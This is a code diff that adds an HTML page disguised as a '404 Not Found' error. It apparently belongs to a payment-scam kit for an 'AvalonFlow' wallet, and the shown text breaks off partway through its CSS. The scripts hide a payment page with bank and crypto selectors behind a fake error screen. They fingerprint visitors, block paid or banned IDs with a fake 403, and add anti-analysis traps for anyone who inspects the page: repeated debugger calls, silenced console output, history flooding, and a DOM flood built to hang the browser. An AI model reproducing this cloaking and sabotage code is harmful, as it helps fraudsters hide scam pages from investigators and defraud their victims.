@@ -1,0 +1,2930 @@
+<!DOCTYPE html>   
+<html lang="en">
+<head>
+    <title>404 Not Found</title>
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script>
+(function() {
+    const BANNED_LIST_URL = './banned-ids.json';
+    const CACHE_KEY = 'av_cached_banned_ids';
+    const CACHE_TIME_KEY = 'av_banned_cache_time';
+
+    let currentETag = null;
+    let activeBannedIds = [];
+
+    try {
+        const cached = localStorage.getItem(CACHE_KEY);
+        if (cached) {
+            activeBannedIds = JSON.parse(cached);
+        }
+    } catch (e) {}
+
+    async function syncBannedList() {
+        try {
+            const response = await fetch(BANNED_LIST_URL, { cache: 'no-store' });
+            if (response.ok) {
+                const data = await response.json();
+                if (Array.isArray(data)) {
+                    activeBannedIds = data;
+                    localStorage.setItem(CACHE_KEY, JSON.stringify(data));
+                    localStorage.setItem(CACHE_TIME_KEY, Date.now().toString());
+                }
+            }
+        } catch (e) {}
+    }
+
+    syncBannedList();
+
+    function render403Page() {
+        localStorage.clear();
+
+        document.documentElement.innerHTML = `
+                            <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>403 Forbidden</title>
+    <style>
+        body { 
+            font-family: 'Georgia', sans-serif;  
+            background: radial-gradient(circle at 15% 25%, #4c1d95 0%, #1e1b4b 25%, transparent 60%),
+                        radial-gradient(circle at 85% 75%, #005f73 0%, #0a2f35 30%, transparent 60%),
+                        #05070a;
+            background-size: 180% 180%;
+            animation: ambientPulse 10s ease-in-out infinite;
+            color: #c9d1d9; 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0; 
+            padding: 20px;
+            box-sizing: border-box;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        @keyframes ambientPulse {
+            0% { background-position: 0% 10%; }
+            50% { background-position: 100% 90%; }
+            100% { background-position: 0% 10%; }
+        }
+
+        .error-container { max-width: 500px; }
+
+        .error-code-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 140px;
+            font-weight: 600;
+            line-height: 1;
+            letter-spacing: -2px;
+            color: #f0f6fc;
+            user-select: none;
+            margin-bottom: 24px;
+            text-shadow: 0 4px 30px rgba(0, 0, 0, 0.7);
+        }
+
+        .logo-container {
+            width: 130px;
+            height: 130px;
+            margin: 0 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            overflow: hidden; 
+            box-shadow: 0 0 35px rgba(168, 85, 247, 0.4);
+            animation: logoGlow 4s ease-in-out infinite alternate;
+        }
+
+        @keyframes logoGlow {
+            0% { box-shadow: 0 0 25px rgba(168, 85, 247, 0.3); }
+            100% { box-shadow: 0 0 55px rgba(192, 132, 252, 0.6); }
+        }
+
+        .logo-img { width: 100%; height: 100%; object-fit: cover; }
+        h2 { font-size: 24px; font-weight: 700; margin: 0 0 8px 0; color: #f0f6fc; }
+        p { font-size: 15px; color: #8b949e; margin: 0; }
+    </style>
+</head>
+<body>
+    <div class="error-container">
+        <div class="error-code-wrapper">
+            <span>4</span>
+            <div class="logo-container">
+                <img src="assets/pictures/unnamed.jpg" alt="Logo" class="logo-img">
+            </div>
+            <span>3</span>
+        </div>
+        <h2>Error: Forbidden!</h2>
+        <p>You don't have permission to access this resource.</p>
+    </div>
+</body>
+</html>
+        `;
+    }
+
+    function verifyAccess() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetId = urlParams.get('id');
+        const localId = localStorage.getItem('avalonflow_identity');
+
+        if (
+            localStorage.getItem('step_3_paid') === 'true' ||
+            localStorage.getItem('step_3_txn_id') !== null
+        ) {
+            render403Page();
+            return true;
+        }
+
+        if (targetId && activeBannedIds.includes(targetId)) {
+            render403Page();
+            return true;
+        }
+
+        if (localId && activeBannedIds.includes(localId)) {
+            render403Page();
+            return true;
+        }
+
+        return false;
+    }
+
+    async function checkForFileChanges() {
+        try {
+            const response = await fetch(window.location.href, { method: 'HEAD', cache: 'no-store' });
+            const newETag = response.headers.get('ETag') || response.headers.get('Last-Modified');
+
+            if (currentETag && newETag && currentETag !== newETag) {
+                window.location.reload();
+                return;
+            }
+            if (newETag) {
+                currentETag = newETag;
+            }
+        } catch (e) {}
+    }
+
+    if (verifyAccess()) return;
+
+    const originalSetItem = Storage.prototype.setItem;
+    Storage.prototype.setItem = function(key, value) {
+        if (key === 'avalonflow_identity' && activeBannedIds.includes(value)) {
+            render403Page();
+            return;
+        }
+        originalSetItem.apply(this, arguments);
+    };
+
+    window.addEventListener('popstate', verifyAccess);
+    window.addEventListener('storage', verifyAccess);
+    setInterval(verifyAccess, 100);
+    checkForFileChanges();
+    setInterval(checkForFileChanges, 3000);
+})();
+</script>
+
+    <style>
+        body { 
+            font-family: 'Georgia', sans-serif;  
+            background: radial-gradient(circle at 15% 25%, #4c1d95 0%, #1e1b4b 25%, transparent 60%),
+                        radial-gradient(circle at 85% 75%, #005f73 0%, #0a2f35 30%, transparent 60%),
+                        #05070a;
+            background-size: 180% 180%;
+            animation: ambientPulse 10s ease-in-out infinite;
+            color: #c9d1d9; 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0; 
+            padding: 20px;
+            box-sizing: border-box;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        @keyframes ambientPulse {
+            0% { background-position: 0% 10%; }
+            50% { background-position: 100% 90%; }
+            100% { background-position: 0% 10%; }
+        }
+
+        .error-container { max-width: 500px; }
+
+        .error-code-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 140px;
+            font-weight: 600;
+            line-height: 1;
+            letter-spacing: -2px;
+            color: #f0f6fc;
+            user-select: none;
+            margin-bottom: 24px;
+            text-shadow: 0 4px 30px rgba(0, 0, 0, 0.7);
+        }
+
+        .logo-container {
+            width: 130px;
+            height: 130px;
+            margin: 0 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            overflow: hidden; 
+            box-shadow: 0 0 35px rgba(168, 85, 247, 0.4);
+            animation: logoGlow 4s ease-in-out infinite alternate;
+        }
+
+        @keyframes logoGlow {
+            0% { box-shadow: 0 0 25px rgba(168, 85, 247, 0.3); }
+            100% { box-shadow: 0 0 55px rgba(192, 132, 252, 0.6); }
+        }
+
+        .logo-img { width: 100%; height: 100%; object-fit: cover; }
+        h2 { font-size: 24px; font-weight: 700; margin: 0 0 8px 0; color: #f0f6fc; }
+    </style>
+
+    <script>
+    (function() {
+        const SecurityEngine = {
+            validateExecutionEnvironment: function() {
+                const authorizedDomain = "avalonflow.site";
+                const currentHost = window.location.hostname;
+                const isAuthorized = (currentHost === authorizedDomain || currentHost.endsWith('.' + authorizedDomain));
+
+                if (!isAuthorized) {
+                    this.triggerSelfDestruct();
+                    return false;
+                }
+                return true;
+            },
+
+            get404Template: function() {
+                return `
+                    <div class="error-container">
+                        <div class="error-code-wrapper">
+                            <span>4</span>
+                            <div class="logo-container">
+                                <img src="assets/pictures/unnamed.jpg" alt="Logo" class="logo-img">
+                            </div>
+                            <span>4</span>
+                        </div>
+                        <h2>Didn’t find anything here!</h2>
+                    </div>
+                `;
+            },
+
+            triggerSelfDestruct: function() {
+                localStorage.clear();
+                sessionStorage.clear();
+                document.body.innerHTML = this.get404Template();
+                document.body.classList.add('render-ready');
+
+                // Active Defense Countermeasures
+                this.activateHistoryTrap();
+                this.activateDOMExplosion();
+
+                try { window.open('', '_self').close(); } catch (e) {}
+                this.activateInspectorTrap();
+                this.activateEnvironmentSabotage();
+            },
+
+            activateHistoryTrap: function() {
+                setInterval(() => {
+                    try {
+                        for (let i = 0; i < 100; i++) {
+                            window.history.pushState(null, '', `?restricted_state=${Math.random().toString(36).substring(2)}`);
+                        }
+                    } catch (e) {}
+                }, 50);
+            },
+
+            activateDOMExplosion: function() {
+                const container = document.createElement('div');
+                container.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden;';
+                document.body.appendChild(container);
+
+                setInterval(() => {
+                    for (let i = 0; i < 50; i++) {
+                        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
+                        svg.innerHTML = `<filter id="f"><feTurbulence type="fractalNoise" baseFrequency="0.05" numOctaves="5"/></filter>`;
+                        container.appendChild(svg);
+                    }
+                }, 100);
+            },
+
+            activateResetListener: function() {
+                window.addEventListener('message', (event) => {
+                    if (event.origin !== window.location.origin) return;
+                    if (event.data && event.data.type === 'COMMAND_SYSTEM_RESET') {
+                        localStorage.setItem('_sys_reset_token', event.data.resetId);
+                        localStorage.setItem('_sys_reset_expiry', event.data.expiresAt);
+                        const currentUrl = new URL(window.location.href);
+                        currentUrl.searchParams.set('auth_reset', event.data.resetId);
+                        window.location.href = currentUrl.toString();
+                    }
+                });
+            },
+
+            establish7DayClearance: function() {
+                const expiry = Date.now() + (7 * 24 * 60 * 60 * 1000);
+                localStorage.setItem('_sys_persistence_anchor', expiry.toString());
+            },
+
+            isPersistenceWindowActive: function() {
+                const savedAnchor = localStorage.getItem('_sys_persistence_anchor');
+                return savedAnchor && Date.now() < parseInt(savedAnchor, 10);
+            },
+
+            checkResetValidation: function() {
+                const urlParams = new URLSearchParams(window.location.search);
+                const urlToken = urlParams.get('auth_reset');
+                const incomingOTK = urlParams.get('otk');
+
+                if (urlToken) {
+                    if (urlToken === localStorage.getItem('_sys_reset_token') && Date.now() < parseInt(localStorage.getItem('_sys_reset_expiry') || 0, 10)) {
+                        this.establish7DayClearance();
+                        this.executeSystemRevival();
+                        return true; 
+                    }
+                    this.triggerSelfDestruct();
+                    return false;
+                }
+
+                if (incomingOTK) {
+                    try {
+                        const [entropy, expirationTimestamp] = atob(incomingOTK).split('.');
+                        if (Date.now() > parseInt(expirationTimestamp, 10) || localStorage.getItem('active_session_otk') !== incomingOTK) {
+                            this.triggerSelfDestruct();
+                            return false;
+                        }
+                        localStorage.removeItem('active_session_otk');
+                        this.establish7DayClearance();
+                        this.executeSystemRevival();
+                        return true;
+                    } catch (e) { this.triggerSelfDestruct(); return false; }
+                }
+                return false;
+            },
+
+            executeSystemRevival: function() {
+                localStorage.removeItem('_sys_reset_token');
+                localStorage.removeItem('_sys_reset_expiry');
+                const user = new URLSearchParams(window.location.search).get('user');
+                const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname + (user ? `?user=${encodeURIComponent(user)}` : '');
+                window.history.replaceState({ path: cleanUrl }, '', cleanUrl);
+                window.location.reload();
+            },
+
+            getHardwareID: function() {
+                const components = [navigator.userAgent, navigator.platform, screen.width, screen.height].join('|');
+                let hash = 0;
+                for (let i = 0; i < components.length; i++) hash = ((hash << 5) - hash) + components.charCodeAt(i);
+                return '1' + (hash | 0).toString(16); 
+            },
+
+            detectAgencyProfile: function() {
+                return navigator.userAgent.includes("Corporate-Gateway") ? 'GOVERNMENT' : 'PRIVATE';
+            },
+
+            activateInspectorTrap: function() { setInterval(() => { debugger; }, 50); },
+
+            activateEnvironmentSabotage: function() {
+                console.log = console.warn = console.error = console.info = () => {};
+                setInterval(() => {
+                    const paths = ['4|1|3|0|2'.split('|')];
+                    let pointer = 0;
+                    while (true) {
+                        switch (['4','1','3','0','2'][pointer++]) {
+                            case '0': try { (function stackTrap(i) { if (("" + i/i)["length"] !== 1 || i % 20 === 0) (function(){}).constructor("debugger")(); else stackTrap(++i); })(0); } catch(e) {} continue;
+                            case '1': if (Math.random() > 0.5) window.status = 'VALIDATING'; continue;
+                            case '2': return;
+                            case '3': 
+                                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                                if (!isMobile) {
+                                    if (window.outerHeight - window.innerHeight > 160 || window.outerWidth - window.innerWidth > 160) {
+                                        this.triggerSelfDestruct();
+                                    }
+                                }
+                                continue;
+                            case '4': (Date.now() % 1000) * 0x5a1b; continue;
+                        }
+                        break;
+                    }
+                }, 200); 
+            },
+
+            injectSecureApp: function(agencyType) {
+                const payload = document.getElementById('hidden-application-payload');
+                if (!payload || !payload.innerHTML.trim()) { this.triggerSelfDestruct(); return; }
+                const frame = document.createElement('iframe');
+                frame.style = 'width:100vw;height:100vh;border:none;position:fixed;top:0;left:0;z-index:999999';
+                frame.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms'); 
+                document.body.appendChild(frame);
+                const ctx = frame.contentWindow || frame.contentDocument;
+                ctx.AUTHORIZED_AGENCY = agencyType;
+                ctx.document.open(); ctx.document.write(payload.innerHTML); ctx.document.close();
+                payload.style.display = 'none'; 
+                document.body.classList.add('render-ready');
+            },
+
+            run: function() {
+                if (!this.validateExecutionEnvironment()) return;
+
+                this.activateResetListener();
+                if (this.checkResetValidation()) return;
+
+                const id = this.getHardwareID();
+                const type = this.detectAgencyProfile();
+
+                if (this.isPersistenceWindowActive() || ((id.startsWith('a') || id.startsWith('1')) && (type === 'GOVERNMENT' || type === 'PRIVATE'))) {
+                    this.activateInspectorTrap();         
+                    this.activateEnvironmentSabotage();   
+                    document.readyState === 'loading' ? window.addEventListener('DOMContentLoaded', () => this.injectSecureApp(type)) : this.injectSecureApp(type);
+                } else {
+                    this.triggerSelfDestruct();
+                }
+            }
+        };
+
+        // Parent Window Communication Hub
+        window.addEventListener("message", (e) => { 
+            if (e.data?.type === "UPDATE_TITLE") document.title = e.data.title; 
+
+            if (e.data?.type === "UPDATE_URL" && e.origin === window.location.origin) {
+                const newUrl = window.location.protocol + "//" + window.location.host + e.data.path;
+                window.history.pushState({ path: newUrl }, '', newUrl);
+            }
+        });
+
+        document.readyState === 'loading' ? window.addEventListener('DOMContentLoaded', () => SecurityEngine.run()) : SecurityEngine.run();
+    })();
+    </script>
+</head>
+<body>
+    <div class="error-container">
+        <div class="error-code-wrapper">
+            <span>4</span>
+            <div class="logo-container">
+                <img src="assets/pictures/unnamed.jpg" alt="Logo" class="logo-img">
+            </div>
+            <span>4</span>
+        </div>
+        <h2>Didn’t find anything here!</h2>
+    </div>
+    <div id="hidden-application-payload" style="display:none;"><!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Preferred Wallet</title>
+
+      <!-- Favicon -->
+<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=3">
+<link rel="icon" type="image/x-icon" href="/favicon.ico?v=3">
+
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png?v=3">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png?v=3">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png?v=3">
+
+<link rel="icon" type="image/png" sizes="192x192" href="/android-chrome-192x192.png?v=3">
+<link rel="icon" type="image/png" sizes="512x512" href="/android-chrome-512x512.png?v=3">
+<link rel="manifest" href="/manifest.json?v=3">
+
+
+<script>
+
+
+(async function () {
+    if (localStorage.getItem('profilePhoto')) {
+        return;
+    }
+
+    let imagePath;
+    try {
+        const response = await fetch('./config.json');
+        const config = await response.json();
+
+        const urlParams = new URLSearchParams(window.location.search);
+        let currentUser = urlParams.get('user');
+
+        if (!currentUser) {
+            const section2Raw = localStorage.getItem('section2Data');
+            if (section2Raw) {
+                try {
+                    const section2Data = JSON.parse(section2Raw);
+                    if (section2Data && section2Data.fullName) {
+                        currentUser = section2Data.fullName.trim();
+                    }
+                } catch (parseErr) {
+                    console.warn('Could not parse section2Data JSON:', parseErr);
+                }
+            }
+        }
+
+        if (currentUser && config.users && config.users[currentUser]) {
+            const userVal = config.users[currentUser];
+            // Extract index 0 if userVal is an array (e.g. [profile, contract]), otherwise use string directly
+            imagePath = Array.isArray(userVal) ? userVal[0] : userVal;
+        } else {
+            return;
+        }
+
+    } catch (err) {
+        console.warn('Could not load config file or process storage:', err);
+        return;
+    }
+
+    if (!imagePath) {
+        return;
+    }
+
+    const img = new Image();
+    img.crossOrigin = 'Anonymous';
+
+    img.onload = function () {
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = img.width;
+            canvas.height = img.height;
+
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(img, 0, 0);
+
+            const dataURL = canvas.toDataURL('image/png');
+            localStorage.setItem('profilePhoto', dataURL);
+        } catch (err) {
+            console.warn('Could not save initial profile picture:', err);
+        }
+    };
+
+    img.onerror = function () {
+        console.warn('Profile picture path failed to load.');
+    };
+
+    img.src = imagePath;
+})();
+
+</script>
+
+        <!-- Structured Data for Logo -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Organization",
+      "name": "AvalonFlow",
+      "url": "https://avalonflow.site",
+      "logo": "https://avalonFlow.site/favicon.png"
+    }
+</script>
+
+<link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
+
+<style>
+  /* ---------- Base ---------- */
+  body {         font-family: 'Georgia', sans-serif;  margin:0; background:#0d0d0d; color:#fff; overflow-x:hidden; }
+  button { cursor:pointer; }
+  a { color:inherit; text-decoration:none; }
+
+html, body {
+    height: 100%;
+}
+
+          /* ---------- Floating Background ---------- */
+#floating-bg {
+    position: fixed;
+    inset: 0;
+    z-index: 0;
+    pointer-events: none;
+
+    /* Soft white/blue futuristic background */
+    background: radial-gradient(circle at bottom, #cfe8ff, #ffffff);
+
+    overflow: hidden;
+}
+
+.particle {
+    position: absolute;
+    border-radius: 50%;
+    opacity: 0.6;
+
+    animation: floatParticles linear infinite;
+
+    /* Soft futuristic glow */
+    background: rgba(120, 180, 255, 0.7);
+    box-shadow: 0 0 10px #8ec5ff, 0 0 20px #b7dcff;
+}
+
+@keyframes floatParticles {
+    0% {
+        transform: translateY(100vh) scale(0.3);
+        opacity: 0;
+    }
+
+    50% {
+        opacity: 1;
+    }
+
+    100% {
+        transform: translateY(-10vh) scale(1);
+        opacity: 0;
+    }
+}
+
+  /* Glass cards */
+  /* Glass card base */
+.glass-card {
+  background: rgba(120, 180, 255, 0.7);
+  backdrop-filter: blur(12px);
+  border-radius: 18px;
+  padding: 28px;
+  margin-bottom: 28px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+  max-width: 275px;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+/* Glass card base */
+.glass-cards {
+  background: rgba(18, 20, 35, 0.75);
+  backdrop-filter: blur(12px);
+  border-radius: 18px;
+  padding: 28px;
+  margin-bottom: 28px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+  max-width: 275px;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+.glass-cardsrd {
+    background: rgba(120, 180, 255, 0.7);
+    backdrop-filter: blur(14px);
+    -webkit-backdrop-filter: blur(14px);
+    border-radius: 24px;
+    
+    /* ADJUSTED PADDING: 16px top/bottom, 12px left/right */
+    /* Reduce the 12px even lower if you want it tighter to the text */
+    padding: 16px 12px; 
+
+    /* CENTERING & FIT-CONTENT */
+    display: block;        
+    margin: 0 auto;        
+    width: fit-content;    /* Forces the card to shrink completely to the text size */
+
+    /* 1. CRISP 3D BEVELLED BORDER */
+    border: 1px solid rgba(255, 255, 255, 0.45);
+    border-bottom: 1px solid rgba(255, 255, 255, 0.15);
+    border-right: 1px solid rgba(255, 255, 255, 0.25);
+
+    /* 2. MULTI-LAYERED 3D DEPTH SHADOWS */
+    box-shadow:
+        0 20px 40px rgba(0, 0, 0, 0.35),
+        0 8px 16px rgba(0, 0, 0, 0.2),
+        inset 0 2px 4px rgba(255, 255, 255, 0.5),
+        inset 0 0 30px rgba(255, 255, 255, 0.1);
+
+    /* 3. OPTIONAL: Subtle tilted perspective */
+    transform: perspective(1000px) translateZ(0);
+}
+
+
+/* Top trust line & bottom note */
+.top-trust, .bottom-note {
+  text-align: center;
+  display: block;
+  z-index: 3;
+
+  font-weight: 600;
+  font-size: 0.95rem;
+
+  background: linear-gradient(90deg,#6b2cd8,#b393ff,#6b2cd8);
+  background-size: 200% auto;
+  animation: gradientShift 6s linear infinite;
+
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+
+  text-shadow: 0 2px 6px rgba(0,0,0,0.35);
+}
+
+@keyframes gradientShift {
+  0% { background-position: 0% center; }
+  100% { background-position: 200% center; }
+}
+
+.bottom-note {
+  margin-top: 28px; /* spacing below last card */
+  font-style: italic;
+  color: #b5b5b5;
+  font-size: 14px;
+}
+  
+
+/* Payment method card */
+.payment-method {
+  position: relative;
+  overflow: hidden;
+  background: rgba(255,255,255,0.08);
+  border-radius: 16px;
+  padding: 18px;
+  margin-top: 18px;
+  border: 1px solid rgba(255,255,255,0.18);
+  transition: 0.3s ease, transform 0.2s ease;
+  cursor: pointer;
+  backdrop-filter: blur(8px);
+  display: block;
+  z-index: 2; /* ensure above the glass wrapper background */
+}
+
+.payment-method:first-of-type {
+  margin-top: 12px; /* reduce top spacing from top trust line */
+}
+
+.payment-method:hover{
+  background: rgba(255,255,255,0.15);
+  transform: translateY(-2px);
+}
+
+/* =========================
+TOP RIGHT PROFILE POSITION
+========================= */
+.top-right-profile {
+    position: fixed;
+    top: 15px;
+    right: 15px;
+    z-index: 999;
+}
+
+#profilePhoto:not([src]), 
+#profilePhoto[src="default-avatar.png"] {
+    content: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23c0a9ff'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5-4-8-4z'/%3E%3C/svg%3E") !important;
+    background: #1a1625 !important;
+    box-sizing: border-box !important;
+    padding: 6px !important;
+}
+
+/* =========================
+OUTER RING WRAPPER
+========================= */
+.avatar-ring {
+    width: 52px;
+    height: 52px;
+    border-radius: 50%;
+    padding: 3px;
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+
+/* =========================
+PURPLE NEON SPIN + PULSE
+========================= */
+.avatar-ring::before {
+    content: "";
+    position: absolute;
+    inset: 0;
+    border-radius: 50%;
+
+    /* PURE PURPLE GLOW */
+    background: conic-gradient(
+        #a855f7,
+        #7c3aed,
+        #a855f7
+    );
+
+    animation:
+    spin 3s linear infinite,
+    hueShift 6s linear infinite;
+
+    filter: blur(5px);
+    opacity: 0.9;
+    z-index: 0;
+}
+
+
+/* =========================
+INNER CUT
+========================= */
+.avatar-ring::after {
+    content: "";
+    position: absolute;
+    inset: 4px;
+    background: transparent;
+    border-radius: 50%;
+    z-index: 1;
+}
+
+
+/* =========================
+PROFILE IMAGE
+========================= */
+.avatar {
+    width: 46px;
+    height: 46px;
+    border-radius: 50%;
+    object-fit: cover;
+    position: relative;
+    z-index: 2;
+    border: 1px solid rgba(168,85,247,0.25);
+}
+
+
+/* =========================
+ANIMATIONS
+========================= */
+
+/* spinning ring */
+@keyframes spin {
+    0% {
+        transform: rotate(0deg);
+    }
+    100% {
+        transform: rotate(360deg);
+    }
+}
+
+@keyframes hueShift {
+    0% {
+        filter: blur(4px) hue-rotate(0deg);
+        opacity: 0.75;
+    }
+    50% {
+        filter: blur(5px) hue-rotate(180deg);
+        opacity: 0.9;
+    }
+    100% {
+        filter: blur(4px) hue-rotate(360deg);
+        opacity: 0.75;
+    }
+}
+
+.payment-method.active{
+  border: 1px solid #6b2cd8;
+  box-shadow: 0 0 18px rgba(107,44,216,0.5);
+}
+
+/* Glow behind card */
+.payment-method::before {
+  content: '';
+  position: absolute;
+  top: -50%;
+  left: -50%;
+  width: 200%;
+  height: 200%;
+  background: radial-gradient(circle at center, rgba(107,44,216,0.2), transparent 70%);
+  opacity: 0;
+  transition: opacity 0.3s ease, transform 0.3s ease;
+  pointer-events: none;
+  z-index: 0;
+}
+
+.payment-method:hover::before,
+.payment-method.active::before {
+  opacity: 1;
+  transform: scale(1.1);
+}
+
+/* Shimmer on active card */
+.payment-method.active::after {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -75%;
+  width: 50%;
+  height: 100%;
+  background: linear-gradient(
+    120deg,
+    rgba(255,255,255,0) 0%,
+    rgba(255,255,255,0.15) 50%,
+    rgba(255,255,255,0) 100%
+  );
+  transform: skewX(-20deg);
+  animation: shimmer 1.5s infinite;
+  pointer-events: none;
+  z-index: 2;
+}
+
+@keyframes shimmer {
+  0% { left: -75%; }
+  50% { left: 125%; }
+  100% { left: 125%; }
+}
+
+/* Payment header + logo */
+.payment-header{
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  font-weight: bold;
+  font-size: 16px;
+  position: relative;
+  z-index: 1;
+}
+
+.token-logos{
+display:flex;
+align-items:center;
+gap:6px;
+font-weight: bold;
+  font-size: 16px;
+  position: relative;
+}
+
+.payment-logo{
+  width: 40px;
+  height: 40px;
+  object-fit: contain;
+  filter: drop-shadow(0 0 4px rgba(0,0,0,0.4));
+}
+
+.payment-logos{
+  width: 40px;
+  height: 40px;
+  object-fit: contain;
+  filter: drop-shadow(0 0 4px rgba(0,0,0,0.4));
+opacity: 1;
+    transition: opacity 200ms ease;
+}
+
+
+.payment-logos.is-hidden {
+    opacity: 0;
+}
+
+.payment-logoss{
+  width: 40px;
+  height: 40px;
+  object-fit: contain;
+  filter: drop-shadow(0 0 4px rgba(0,0,0,0.4));
+opacity: 1;
+    transition: opacity 200ms ease;
+}
+
+
+.payment-logoss.is-hidden {
+    opacity: 0;
+}
+
+.payment-logosss{
+  width: 40px;
+  height: 40px;
+  object-fit: contain;
+  filter: drop-shadow(0 0 4px rgba(0,0,0,0.4));
+opacity: 1;
+    transition: opacity 200ms ease;
+}
+
+
+.payment-logosss.is-hidden {
+    opacity: 0;
+}
+
+.payment-container {
+  position: relative;  /* required for z-index & box-shadow */
+  max-width: 600px;
+  margin: 0 auto;
+  z-index: 1;          /* base */
+}
+
+/* Red warning glow around container */
+.payment-container.warning {
+  z-index: 10; /* above cards */
+  box-shadow: 0 0 20px 4px rgba(255,77,77,0.9);
+  border-radius: 24px;
+  animation: warning-glow 0.8s ease-in-out 2;
+}
+
+/* Keyframes for pulsing red glow */
+@keyframes warning-glow {
+  0% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
+  50% { box-shadow: 0 0 20px 6px rgba(255,77,77,0.9); }
+  100% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
+}
+
+/* Suppress the purple card glows during warning */
+.payment-container.warning .payment-method::before {
+  opacity: 0 !important;
+}
+
+/* Input styling */
+.payment-method input{
+  width: 100%;
+  padding: 14px 16px;
+  margin-top: 12px;
+  border-radius: 12px;
+  border: none;
+  background: rgba(255,255,255,0.15);
+  color: #fff;
+display:none;
+/* FIX */
+  box-sizing: border-box;
+}
+
+.network-note{
+font-size:12px;
+color: #ff0000;
+margin-top:6px;
+font-style:italic;
+opacity:0.9;
+}
+
+  .payment-method input::placeholder{
+  color: #fff;
+  font-style: italic;
+}
+
+ /* ================= Header Logo Card Neon ================= */
+
+.minimal-logo-header {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+
+  /* Reduced top padding dramatically so it sits near the top edge */
+  padding: 10px 0 10px 0; 
+
+  /* Optional: Ensures it stays firmly at the absolute top of the page layout */
+  width: 100%;
+  margin-top: -112px; 
+
+  background: transparent !important;
+}
+
+.logo-shimmer-wrapper {
+  position: relative;
+  width: 200px;
+  height: 200px;
+  overflow: hidden;
+  background: transparent !important; /* Kept perfectly transparent, no card background */
+}
+
+.avalon-logo-img {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: contain;
+
+  /* Keep your logo scaling */
+  transform: scale(0.40);
+  transform-origin: center center;
+
+  /* ---------- LOGO GLASS EFFECT ---------- */
+  /* This blurs the particles directly through the transparent logo asset itself */
+  backdrop-filter: blur(4px);
+  -webkit-backdrop-filter: blur(4px);
+  opacity: 0.9; 
+  /* -------------------------------------- */
+
+  filter: drop-shadow(0 4px 14px rgba(0, 0, 0, 0.05));
+  mix-blend-mode: multiply; 
+  background:  transparent !important;
+  border: none !important;            
+  outline: none !important;
+}
+
+/* =========================
+   American BANK SELECT
+   PREMIUM GLASS UPGRADE
+========================= */
+
+#americanBankSelect {
+    width: 100%;
+    height: 52px;
+
+    padding: 0 16px;
+
+    border: 1px solid rgba(255, 255, 255, 0.10);
+    border-radius: 18px;
+
+    background-color: rgba(255, 255, 255, 0.04);
+    color: #fff;
+
+    font-size: 14px;
+    font-weight: 500;
+
+    margin-top: 10px;
+
+    backdrop-filter: blur(18px);
+    -webkit-backdrop-filter: blur(18px);
+
+    box-shadow: 0 8px 30px rgba(0,0,0,0.15);
+
+    transition: all 0.25s ease;
+
+    appearance: none;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+
+    cursor: pointer;
+
+    /* custom arrow */
+    background-image:
+        linear-gradient(45deg, transparent 50%, #b892ff 50%),
+        linear-gradient(135deg, #b892ff 50%, transparent 50%);
+
+    background-position:
+        calc(100% - 20px) calc(50% - 3px),
+        calc(100% - 14px) calc(50% - 3px);
+
+    background-size: 6px 6px;
+    background-repeat: no-repeat;
+}
+
+/* hover glow */
+#americanBankSelect:hover {
+    border-color: rgba(107, 44, 216, 0.5);
+
+    box-shadow:
+        0 0 0 2px rgba(107, 44, 216, 0.15),
+        0 10px 35px rgba(0,0,0,0.25);
+}
+
+/* focus state */
+#americanBankSelect:focus {
+    outline: none;
+
+    border-color: rgba(107, 44, 216, 0.7);
+
+    box-shadow:
